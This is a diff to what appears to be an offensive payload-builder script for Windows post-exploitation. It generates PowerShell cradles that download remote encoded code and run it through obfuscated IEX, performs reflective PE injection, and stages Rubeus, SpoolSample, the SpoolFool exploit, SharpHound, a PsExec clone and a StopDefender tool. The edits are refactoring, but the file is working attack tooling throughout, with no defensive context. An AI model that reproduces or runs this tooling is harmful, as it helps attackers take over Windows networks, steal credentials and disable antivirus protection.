@@ -415,9 +415,9 @@ def simple(filepath, desc=None):
 
 def c_exe(filepath, desc, _type='enc', _args='$null'):
     # TODO: _args
-    pandora('ps-2', pscmdType=_type, shellUrl=TempUtil.getFileUrl(filepath, encFn), Tvar=dict(inject_name=args.inject, \
-            import_reflect=dict(url=TempUtil.getFileUrl('Invoke-ReflectivePEInjection.ps1', encFn), var='ii', \
-            postCode='[System.Text.Encoding]::ASCII.GetString($ii) | `i`e`x; $exeArgs=%s;' % _args)), desc=desc)
+    pandora('ps-2', pscmdType=_type, shellUrl=TempUtil.getFileUrl(filepath, encFn), \
+            Tvar=dict(inject_name=args.inject, import_reflect=wlmgr.getCmd(desc2='Invoke-ReflectivePEInjection.ps1'), \
+            var='ii', postCode='[System.Text.Encoding]::ASCII.GetString($ii) | `i`e`x; $exeArgs=%s;' % _args), desc=desc)
 
 def cs_exe(filepath, desc, classname=None, funcname=None):
     _func = os.path.splitext(os.path.basename(filepath))[0]
@@ -437,6 +437,7 @@ def ez_fit(filepath, **tvar):
 
 # ===================
 
+
 # TODO: separate msf / Covenant / Empire
 pandora('py-1', postCode=('run(buf)' if args.os == 'win' else 'write_linux(buf)'), desc='py-1')
 pandora('ps-1', desc='ps-1')
@@ -453,12 +454,23 @@ pandora('vb-1')
 cs_exe('Rubeus.exe', 'Rubeus')
 cs_exe('SpoolSample.exe', 'SpoolSample', 'SpoolSample.SpoolSample')
 cs_exe('SpoolFool.exe', 'SpoolFool (CVE-2022-21999) on Windows Desktop ( Invoke-SpoolFool -dll AddUser.dll )')
-cs_exe('myPsExec.exe', '[myPsExec.Program]::MainString("appsrv01 SensorDataService powershell -ep bypass -c `"iwr ...`"")', 
+cs_exe('myPsExec.exe', 'Invoke-myPsExec appsrv01 SensorDataService "powershell -c `"iwr ...`""', 
         'myPsExec.Program')
 #cs_exe('csexec.exe', '[csexec.Program]::MainString("\\\\<target> cmd") [Failed]')
-cs_exe('SQL.exe', '[SQL.SQL]::Main(@("<servername>", "<sql>")) # separator = `n', 'SQL.SQL')
-cs_exe('SharpHound.exe', '[SharpHound.Program]::Main(@("-c", "All,GPOLocalGroup", "--outputdirectory", "$env:tmp", "-s"))', 
+cs_exe('SQL.exe', 'Invoke-SQL "<servername>" "<sql>" # separator = `n', 'SQL.SQL')
+cs_exe('SharpHound.exe', 'Invoke-Bloodhound -c "All,GPOLocalGroup" --outputdirectory $env:tmp -s -Domain xxx.com', 
         'SharpHound.Program', 'Invoke-Bloodhound')
+
+for common_psmodule in app['common-pstool']:
+    c = ''
+    _record = not common_psmodule.get('hidden', False)
+    for dep in common_psmodule.get('dependency', list()):
+        c += wlmgr.getCmd(desc2=dep) + ';'
+    common_psmodule['filepath'] = remove_pscomment(common_psmodule['filepath'])
+    data = ez_fit(common_psmodule['filepath'], dependency=c)
+    pandora('custom-ps', shellUrl=TempUtil.getBytesUrl(data, encFn), pscmdType='raw', \
+            postCode='[System.Text.Encoding]::ASCII.GetString($buf)|IEX;', desc=common_psmodule['name'])
+
 
 c_exe('StopDefender.exe', 'StopDefender')
 #c_exe('./artifact/PrintSpoofer.exe', 'PrintSpoofer.exe')
@@ -506,17 +518,6 @@ if netclr == 'v4.0' and _os == 'windows':
     pandora('service-2', useTransform=False, FILENAME='svc_.ps1')
     pandora('msbuild-1', Tvar=dict(psraw=command.replace('"', '""')), useTransform=False, FILENAME='gm.ps1') # TODO: amsi might need invoke first in stageless mode
     pandora('psexec-1', useTransform=False)
-
-for common_psmodule in app['common-pstool']:
-    c = ''
-    _record = not common_psmodule.get('hidden', False)
-    for dep in common_psmodule.get('dependency', list()):
-        c += wlmgr.getCmd(desc2=dep) + ';'
-    common_psmodule['filepath'] = remove_pscomment(common_psmodule['filepath'])
-    data = ez_fit(common_psmodule['filepath'], dependency=c)
-    pandora('custom-ps', shellUrl=TempUtil.getBytesUrl(data, encFn), pscmdType='raw', \
-            postCode='[System.Text.Encoding]::ASCII.GetString($buf)|IEX;', desc=common_psmodule['name'])
-
 
 
 if args.ps1:
